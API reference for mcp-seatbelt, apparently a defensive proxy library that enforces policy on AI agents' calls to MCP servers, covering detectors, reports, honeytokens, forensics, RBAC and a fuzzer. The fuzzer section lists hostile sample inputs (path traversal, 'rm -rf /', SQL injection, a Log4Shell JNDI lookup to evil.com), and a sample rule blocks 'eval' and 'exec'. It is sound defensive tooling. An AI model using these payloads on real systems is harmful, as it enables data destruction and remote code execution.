# mcp-seatbelt API

Programmatic API reference for using mcp-seatbelt as a library.

> **API Stability:** All public APIs follow semver. Breaking changes to exported interfaces will be accompanied by a major version bump.

## Table of Contents

- [Quick Start](#quick-start)
- [Proxy Server](#proxy-server)
  - [ProxyServer](#proxyserver)
  - [RegisteredServer](#registeredserver)
  - [interceptRequest](#interceptrequest)
  - [filterToolsListResponse](#filtertoolslistresponse)
  - [filterResourcesListResponse](#filterresourceslistresponse)
  - [filterPromptsListResponse](#filterpromptslistresponse)
  - [MCPRequest](#mcprequest)
  - [MCPResponse](#mcpresponse)
- [Policy Engine](#policy-engine)
  - [PolicyEngine](#policyengine)
  - [validatePolicy](#validatepolicy)
  - [DEFAULT_POLICY](#default_policy)
  - [generateDefaultPolicy](#generatedefaultpolicy)
  - [generateDefaultPolicyFile](#generatedefaultpolicyfile)
  - [Policy Types](#policy-types)
- [Detectors](#detectors)
  - [detectAll](#detectall)
  - [detectByClient](#detectbyclient)
  - [parseMcpServers](#parsemcpservers)
  - [assessRisk](#assessrisk)
- [Reports](#reports)
  - [generateMarkdownReport](#generatemarkdownreport)
  - [generateJsonReport](#generatejsonreport)
  - [generateSarifReport](#generatesarifreport)
- [Observatory Bridge](#observatory-bridge)
  - [importObservatoryResults](#importobservatoryresults)
  - [mergeObservatoryPolicy](#mergeobservatorypolicy)
  - [discoverObservatoryArtifacts](#discoverobservatoryartifacts)
- [Security Modules](#security-modules)
  - [Attack Chains](#attack-chains)
  - [Honeytokens](#honeytokens)
  - [Forensics](#forensics)
  - [Fuzzer](#fuzzer)
  - [Schema Validator](#schema-validator)
- [RBAC](#rbac)
- [Threat Intelligence](#threat-intelligence)
- [OWASP & Compliance Mapping](#owasp--compliance-mapping)
- [Types](#types)

---

## Quick Start

```ts
import { ProxyServer, PolicyEngine, detectAll, validatePolicy, assessRisk } from 'mcp-seatbelt';

// New in v0.4.0:
// import { trackCall, injectHoneytokens, startSessionCapture, fuzzTool,
//          compileToolSchema, initRBAC, checkThreatIntel, mapRiskToOWASP } from 'mcp-seatbelt';
```

```ts
// Full example: detect configs, create a policy, start the proxy
import { ProxyServer, PolicyEngine, detectAll, generateMarkdownReport } from 'mcp-seatbelt';

const configs = await detectAll();

const policy = new PolicyEngine({
  version: '1',
  mode: 'enforce',
  defaultAction: 'deny',
  rules: [],
  allowlist: { tools: [], paths: [], hosts: [], envVars: [] },
});

const proxy = new ProxyServer(policy, 9420);

for (const config of configs) {
  for (const server of config.servers) {
    proxy.register(server, config.client);
  }
}

await proxy.start();
console.log(generateMarkdownReport(configs));
```

---

## Proxy Server

### `ProxyServer`

The main programmatic entry point. Starts a policy-enforcing JSON-RPC 2.0 proxy that sits between AI agents and MCP servers.

**Import:** `import { ProxyServer } from 'mcp-seatbelt'`

```ts
class ProxyServer {
  constructor(policy: PolicyEngine, port?: number)

  register(server: McpServerConfig, client: string): void
  registerServer(config: McpServerConfig): void

  async start(): Promise<void>
  async stop(): Promise<void>

  getServers(): RegisteredServer[]
  isRunning(): boolean
  getProxyUrl(name: string): string
  getStats(): ProxyStats
}
```

**Example:**

```ts
import { ProxyServer, PolicyEngine, detectAll } from 'mcp-seatbelt';

const configs = await detectAll();
const policy = new PolicyEngine({
  version: '1',
  mode: 'enforce',
  defaultAction: 'deny',
  rules: [],
  allowlist: { tools: [], paths: [], hosts: [], envVars: [] },
});

const proxy = new ProxyServer(policy, 9420);

for (const config of configs) {
  for (const server of config.servers) {
    proxy.register(server, config.client);
  }
}

await proxy.start();
console.log(proxy.getStats());
```

---

### `RegisteredServer`

```ts
interface RegisteredServer {
  name: string;
  originalUrl: string;
  proxyUrl: string;
  risk: string;
}
```

### `interceptRequest`

Intercepts an MCP request and evaluates it against the policy engine.

**Import:** `import { interceptRequest } from 'mcp-seatbelt'`

```ts
function interceptRequest(
  request: MCPRequest,
  policy: PolicyEngine,
  serverName: string,
): MCPResponse | null
```

### `filterToolsListResponse`

Filters denied tools from a `tools/list` response.

```ts
function filterToolsListResponse(
  response: MCPResponse,
  policy: PolicyEngine,
  serverName: string,
): MCPResponse
```

### `filterResourcesListResponse`

Filters denied resources from a `resources/list` response.

```ts
function filterResourcesListResponse(
  response: MCPResponse,
  policy: PolicyEngine,
  serverName: string,
): MCPResponse
```

### `filterPromptsListResponse`

Filters denied prompts from a `prompts/list` response.

```ts
function filterPromptsListResponse(
  response: MCPResponse,
  policy: PolicyEngine,
  serverName: string,
): MCPResponse
```

### `MCPRequest`

```ts
interface MCPRequest {
  jsonrpc: string;
  method: string;
  params?: {
    name?: string;
    arguments?: Record<string, unknown>;
    [key: string]: unknown;
  };
  id?: number | string | null;
}
```

### `MCPResponse`

```ts
interface MCPResponse {
  jsonrpc: string;
  result?: unknown;
  error?: { code: number; message: string; data?: unknown };
  id?: number | string | null;
}
```

---

## Policy Engine

mcp-seatbelt ships with **7 built-in policy rules** and **3 reusable policy templates** (audit, enforce, and permissive). The test suite includes **485 tests** to validate policy evaluation, risk assessment, proxy behavior, and all security modules.

### `PolicyEngine`

Evaluates tool calls against a policy configuration.

**Import:** `import { PolicyEngine } from 'mcp-seatbelt'`

```ts
class PolicyEngine {
  constructor(config: PolicyConfig)

  evaluate(
    toolName: string,
    toolDescription: string,
    args: Record<string, unknown>,
  ): { action: 'allow' | 'deny' | 'warn'; reasons: string[] }

  addRule(rule: PolicyRule): void
  removeRule(id: string): void
  updateRule(id: string, partial: Partial<PolicyRule>): void

  async loadFromFile(yamlPath: string): Promise<void>
  async saveToFile(yamlPath: string): Promise<void>

  getStats(): { rules: number; allowlisted: number }
}
```

**Example:**

```ts
import { PolicyEngine } from 'mcp-seatbelt';

const engine = new PolicyEngine({
  version: '1',
  mode: 'enforce',
  defaultAction: 'deny',
  rules: [
    {
      id: 'block-eval',
      description: 'Block eval tools',
      target: 'process',
      match: 'contains',
      values: ['eval', 'exec'],
      action: 'deny',
    },
  ],
  allowlist: { tools: ['safe-tool'], paths: [], hosts: [], envVars: [] },
});

const result = engine.evaluate('eval_tool', 'runs arbitrary eval', { code: '1+1' });
// { action: 'deny', reasons: ['[block-eval] Block eval tools'] }
```

---

### `validatePolicy`

Validates a raw policy object against the schema.

**Import:** `import { validatePolicy } from 'mcp-seatbelt'`

```ts
function validatePolicy(config: unknown): PolicyConfig
```

Throws on invalid config with a descriptive error.

**Example:**

```ts
import { validatePolicy } from 'mcp-seatbelt';

try {
  const policy = validatePolicy(rawConfig);
  // policy is now typed as PolicyConfig
} catch (err) {
  console.error('Invalid policy:', err.message);
}
```

---

### `DEFAULT_POLICY`

A ready-to-use default policy with 7 built-in deny rules for shell execution, sensitive paths, credentials, private networks, process spawning, and more.

**Import:** `import { DEFAULT_POLICY } from 'mcp-seatbelt'`

```ts
const DEFAULT_POLICY: PolicyConfig
```

### `generateDefaultPolicy`

Generates a policy from detected client configs.

```ts
function generateDefaultPolicy(
  configs: McpClientConfig[],
  mode?: string,
): PolicyConfig
```

### `generateDefaultPolicyFile`

Generates the default policy file content as a YAML string using one of the 3 built-in policy templates.

```ts
function generateDefaultPolicyFile(): string
```

---

### Policy Types

```ts
interface PolicyConfig {
  version: string;
  mode: 'audit' | 'enforce';
  defaultAction: 'allow' | 'deny';
  rules: PolicyRule[];
  allowlist: {
    tools: string[];
    paths: string[];
    hosts: string[];
    envVars: string[];
  };
}

interface PolicyRule {
  id: string;
  description: string;
  target: 'command' | 'file' | 'network' | 'env' | 'process';
  match: 'exact' | 'pattern' | 'contains';
  values: string[];
  action: 'allow' | 'deny' | 'warn';
}
```

---

## Detectors

### `detectAll`

Scans the system for MCP configurations across 8 supported clients and returns typed results.

**Import:** `import { detectAll } from 'mcp-seatbelt'`

```ts
async function detectAll(): Promise<McpClientConfig[]>
```

Supported clients: Cursor, Claude Desktop, ChatGPT Desktop, VS Code, Codex, Windsurf, JetBrains IDEs, project-local configs.

**Example:**

```ts
import { detectAll } from 'mcp-seatbelt';

const configs = await detectAll();
for (const config of configs) {
  console.log(`Client: ${config.client}`);
  for (const server of config.servers) {
    console.log(`  ${server.name}: ${server.risk.level} risk`);
  }
}
```

### `detectByClient`

Filters detected configs by client name.

```ts
async function detectByClient(clientName: string): Promise<McpClientConfig[]>
```

### `parseMcpServers`

Parses a raw `mcpServers` object into typed `McpServerConfig[]`.

```ts
function parseMcpServers(raw: Record<string, unknown>): McpServerConfig[]
```

### `assessRisk`

Scores a server config for risk. Returns a `RiskAssessment`.

**Import:** `import { assessRisk } from 'mcp-seatbelt'`

```ts
function assessRisk(server: McpServerConfig): RiskAssessment
```

Runs 13 built-in risk rules covering shell interpreters, sandbox bypass, credential exposure, network tools, process spawning, destructive filesystem operations, remote access, privileged Docker containers, risky packages, privilege escalation, and sensitive paths.

```ts
interface RiskAssessment {
  score: number;
  level: 'low' | 'medium' | 'high' | 'critical';
  flags: RiskFlag[];
}

interface RiskFlag {
  rule: string;
  description: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
}
```

---

## Reports

### `generateMarkdownReport`

Generates a human-readable markdown risk report from detected configs.

**Import:** `import { generateMarkdownReport } from 'mcp-seatbelt'`

```ts
function generateMarkdownReport(configs: McpClientConfig[]): string
```

### `generateJsonReport`

Generates a machine-readable JSON risk report.

**Import:** `import { generateJsonReport } from 'mcp-seatbelt'`

```ts
function generateJsonReport(configs: McpClientConfig[]): RiskReport
```

### `generateSarifReport`

Generates a SARIF 2.1.0 JSON log for integration with GitHub Code Scanning and other SARIF-compatible tools.

**Import:** `import { generateSarifReport } from 'mcp-seatbelt'`

```ts
function generateSarifReport(configs: McpClientConfig[]): SARIFLog
```

Maps risk levels: critical→error, high→error, medium→warning, low→note. Each risk flag becomes a SARIF result with ruleId, level, message, and location information.

---

## Observatory Bridge

### `importObservatoryResults`

Converts mcp-observatory security findings to seatbelt policy rules.

**Import:** `import { importObservatoryResults } from 'mcp-seatbelt'`

```ts
function importObservatoryResults(artifactPath: string): PolicyRule[]
```

### `mergeObservatoryPolicy`

Merges observatory findings into an existing seatbelt policy.

**Import:** `import { mergeObservatoryPolicy } from 'mcp-seatbelt'`

```ts
function mergeObservatoryPolicy(
  seatbeltPolicy: PolicyConfig,
  observatoryArtifactPath: string,
): PolicyConfig
```

### `discoverObservatoryArtifacts`

Auto-discovers observatory artifact files from `.mcp-observatory/runs/` and `.mcp-observatory-metrics/`.

**Import:** `import { discoverObservatoryArtifacts } from 'mcp-seatbelt'`

```ts
function discoverObservatoryArtifacts(basePath?: string): string[]
```

---

## Security Modules

### Attack Chains

XState-based state machine tracking multi-step attack patterns: recon → execution → persistence → exfiltration.

**Import:** `import { trackCall, cleanupSession, getSessionCount } from 'mcp-seatbelt'`

```ts
function trackCall(call: CallEvent): { alert: boolean; state: string }
function cleanupSession(sessionId: string): void
function getSessionCount(): number

interface CallEvent {
  toolName: string;
  args: Record<string, unknown>;
  sessionId: string;
  timestamp: number;
}
```

`trackCall()` classifies each tool call (READ_SENSITIVE, SHELL_EXEC, NETWORK_CALL, etc.) and transitions the XState machine. Returns `{ alert: true }` when the `exfiltration_confirmed` state is reached.

**Example:**

```ts
import { trackCall, cleanupSession } from 'mcp-seatbelt';

const result = trackCall({
  toolName: 'read_file',
  args: { path: '/etc/passwd' },
  sessionId: 'session-123',
  timestamp: Date.now(),
});

if (result.alert) {
  console.error('Attack chain detected!'); // recon → exfiltration chain
}
```

---

### Honeytokens

Plants decoy credentials (AWS keys, GitHub tokens, database connection strings) in tool responses and detects their use in subsequent calls.

**Import:** `import { injectHoneytokens, detectHoneytokenAccess, getDetectionLog, getPlantedCount, getDetectedCount, clearHoneytokens } from 'mcp-seatbelt'`

```ts
function injectHoneytokens(
  response: any,
  options: InjectOptions,
): { modified: boolean; planted: number }

function detectHoneytokenAccess(
  args: Record<string, unknown>,
  serverName: string,
): Honeytoken | null

function getDetectionLog(): Honeytoken[]
function getPlantedCount(): number
function getDetectedCount(): number
function clearHoneytokens(): void

interface Honeytoken {
  id: string;
  type: 'aws_key' | 'github_token' | 'slack_webhook' | 'private_key' | 'api_key' | 'db_connection';
  value: string;
  plantedIn: string;
  plantedAt: number;
  detected: boolean;
  detectedAt?: number;
  detectedIn?: string;
}

interface InjectOptions {
  types?: Array<'aws_key' | 'github_token' | 'slack_webhook' | 'private_key' | 'api_key' | 'db_connection'>;
  serverName: string;
  sessionId: string;
}
```

**Example:**

```ts
import { injectHoneytokens, detectHoneytokenAccess } from 'mcp-seatbelt';

const { modified, planted } = injectHoneytokens(response, {
  serverName: 'filesystem',
  sessionId: 'abc-123',
});

// Later, check if attacker used a planted token
const detected = detectHoneytokenAccess({ api_key: 'ghp_...' }, 'network');
if (detected) console.error('Honeytoken accessed!', detected.type);
```

---

### Forensics

Records complete request/response pairs as signed `.mcpcap.json` session files for incident analysis.

**Import:** `import { startSessionCapture, captureRequest, captureResponse, saveSession, stopSessionCapture, getActiveSession, setSessionDir, getSessionDir } from 'mcp-seatbelt'`

```ts
async function startSessionCapture(): Promise<string>
function captureRequest(request: unknown): void
function captureResponse(response: unknown): void
async function saveSession(): Promise<string | null>
function stopSessionCapture(): void
function getActiveSession(): SessionCapture | null
function setSessionDir(dir: string): void
function getSessionDir(): string

interface ForensicEvent {
  timestamp: number;
  direction: 'request' | 'response';
  payload: unknown;
}

interface SessionCapture {
  sessionId: string;
  startedAt: number;
  events: ForensicEvent[];
}
```

**Example:**

```ts
import { startSessionCapture, captureRequest, captureResponse, saveSession } from 'mcp-seatbelt';

const sessionId = await startSessionCapture();

captureRequest({ jsonrpc: '2.0', method: 'tools/call', params: { name: 'read' } });
captureResponse({ jsonrpc: '2.0', result: { content: [{ type: 'text', text: '...' }] } });

const filepath = await saveSession();
console.log(`Session saved: ${filepath}`); // → .mcp-seatbelt/sessions/<uuid>.mcpcap.json
```

---

### Fuzzer

Generates edge-case payloads from JSON schemas and tests policy bypass resilience.

**Import:** `import { fuzzTool, fuzzServer } from 'mcp-seatbelt'`

```ts
async function fuzzTool(
  toolName: string,
  toolSchema: object | undefined,
  policy: PolicyEngine,
  options?: { iterations?: number; sessionId?: string },
): Promise<FuzzResult>

async function fuzzServer(
  serverName: string,
  tools: Array<{ name: string; inputSchema?: object }>,
  policy: PolicyEngine,
  options?: { iterations?: number },
): Promise<FuzzResult[]>

interface FuzzResult {
  toolName: string;
  totalTested: number;
  blocked: number;
  allowed: number;
  bypasses: Array<{
    payload: unknown;
    expectedAction: 'deny' | 'warn';
    actualAction: string;
    description: string;
  }>;
}
```

Generates randomized arguments via `json-schema-faker` and injects edge cases: path traversal (`../../etc/passwd`), command injection (`rm -rf /`), SQL injection (`'; DROP TABLE users; --`), Log4Shell (`${jndi:ldap://evil.com/a}`), and null-byte injection.

**Example:**

```ts
import { fuzzTool, PolicyEngine, DEFAULT_POLICY } from 'mcp-seatbelt';

const policy = new PolicyEngine(DEFAULT_POLICY);
const result = await fuzzTool('execute_command', toolSchema, policy, { iterations: 200 });

console.log(`Blocked: ${result.blocked}, Bypasses: ${result.bypasses.length}`);
for (const b of result.bypasses) {
  console.log(`  ${b.description} → ${b.actualAction}`);
}
```

---

### Schema Validator

Validates tool arguments against declared JSON Schemas using AJV. Also performs path safety checks for traversal, null-byte injection, and sensitive paths.

**Import:** `import { compileToolSchema, validateToolArgs, validatePathSafety, clearSchemaCache, getSchemaCount } from 'mcp-seatbelt'`

```ts
function compileToolSchema(toolName: string, schema: object): void
function validateToolArgs(
  toolName: string,
  args: unknown,
): { valid: boolean; errors: string[] }

function validatePathSafety(
  args: Record<string, unknown>,
): { safe: boolean; violations: string[] }

function clearSchemaCache(): void
function getSchemaCount(): number
```

**Example:**

```ts
import { compileToolSchema, validateToolArgs, validatePathSafety } from 'mcp-seatbelt';

compileToolSchema('read_file', {
  type: 'object',
  properties: { path: { type: 'string' } },
  required: ['path'],
});

const args = { path: '/etc/passwd' };
const { valid, errors } = validateToolArgs('read_file', args);
const { safe, violations } = validatePathSafety(args);

if (!safe) console.error('Path violations:', violations);
```

---

## RBAC

Casbin-based role-based access control for agents and tools.

**Import:** `import { initRBAC, checkAccess, getEnforcer } from 'mcp-seatbelt'`

```ts
async function initRBAC(modelPath?: string, policyPath?: string): Promise<void>
async function checkAccess(agentId: string, toolName: string, action: string): Promise<boolean>
function getEnforcer(): Enforcer | null
```

Reads casbin model (`.conf`) and policy (`.csv`) files from `.mcp-seatbelt/` by default. `checkAccess` returns `true` if the agent is authorized to perform the action on the tool. If the enforcer has not been initialized, `checkAccess` returns `true` (open access).

**Example:**

```ts
import { initRBAC, checkAccess } from 'mcp-seatbelt';

await initRBAC(); // reads .mcp-seatbelt/rbac_model.conf and rbac_policy.csv

if (await checkAccess('admin-agent', 'execute_shell', 'execute')) {
  // admin can execute all tools
}

if (await checkAccess('readonly-agent', 'execute_shell', 'execute')) {
  // denied — readonly agent can't execute shell tools
}
```

---

## Threat Intelligence

Async ThreatFox IOC lookup for IPs and domains in tool arguments.

**Import:** `import { checkThreatIntel, clearCache as clearThreatIntelCache } from 'mcp-seatbelt'`

```ts
async function checkThreatIntel(
  args: Record<string, unknown>,
): Promise<ThreatIntelResult[]>

function clearCache(): void

interface ThreatIntelResult {
  malicious: boolean;
  source: string;
  queryType: 'ip' | 'domain' | 'hash';
  queryValue: string;
  details: string;
}
```

Automatically extracts IP addresses and domain names from tool arguments, queries ThreatFox API, and caches results for 1 hour. Timeout is 3 seconds per query.

**Example:**

```ts
import { checkThreatIntel } from 'mcp-seatbelt';

const results = await checkThreatIntel({ host: '192.168.1.1', url: 'evil.com' });
for (const r of results) {
  if (r.malicious) {
    console.error(`Blocked: ${r.queryValue} is malicious (${r.details})`);
  }
}
```

---

## OWASP & Compliance Mapping

Maps risk rule IDs to OWASP LLM Top 10 categories and compliance frameworks.

**Import:** `import { OWASP_LLM_MAPPING, mapRiskToOWASP, OWASP_LLM_TAXONOMY_ENTRIES, COMPLIANCE_TAXONOMY_ENTRIES } from 'mcp-seatbelt'`

```ts
const OWASP_LLM_MAPPING: Record<string, { id: string; title: string; severity: string }>
function mapRiskToOWASP(riskRuleId: string): string[]

const OWASP_LLM_TAXONOMY_ENTRIES: Array<{ id: string; title: string; severity: string }>
const COMPLIANCE_TAXONOMY_ENTRIES: Array<{ id: string; title: string; framework: string }>
```

Maps 13 risk rules to OWASP categories: `shell-interpreter` → LLM06 (Excessive Agency), `sensitive-env` → LLM02 (Sensitive Information Disclosure), `risky-package` → LLM09 (Supply Chain Vulnerabilities), etc. Compliance entries cover SOC2, HIPAA, GDPR, PCI-DSS, ISO 27001, and NIST.

**Example:**

```ts
import { mapRiskToOWASP, COMPLIANCE_TAXONOMY_ENTRIES } from 'mcp-seatbelt';

const owaspIds = mapRiskToOWASP('shell-interpreter');
console.log(owaspIds); // ['LLM06']

for (const entry of COMPLIANCE_TAXONOMY_ENTRIES) {
  console.log(`${entry.id}: ${entry.title}`); // SOC2, HIPAA, GDPR, PCIDSS, ISO27001, NIST
}
```

---

## Types

```ts
interface McpClientConfig {
  client: string;
  path: string;
  servers: McpServerConfig[];
}

interface McpServerConfig {
  name: string;
  command: string;
  args: string[];
  env?: Record<string, string>;
  transport: 'stdio' | 'http' | 'sse';
  url?: string;
  risk: RiskAssessment;
}

interface RiskReport {
  generatedAt: string;
  summary: {
    totalServers: number;
    highRisk: number;
    mediumRisk: number;
    lowRisk: number;
    blockedCalls: number;
    allowedCalls: number;
    warnedCalls: number;
  };
  servers: ServerReport[];
  recommendations: string[];
}

interface ServerReport {
  name: string;
  client: string;
  risk: RiskAssessment;
  tools: ToolReport[];
  proxied: boolean;
}

interface ToolReport {
  name: string;
  description: string;
  riskFlags: RiskFlag[];
  policyAction: 'allow' | 'deny' | 'warn';
}

interface ProxyStats {
  totalRequests: number;
  blocked: number;
  allowed: number;
  warned: number;
  startTime: string;
  uptime: number;
}
```
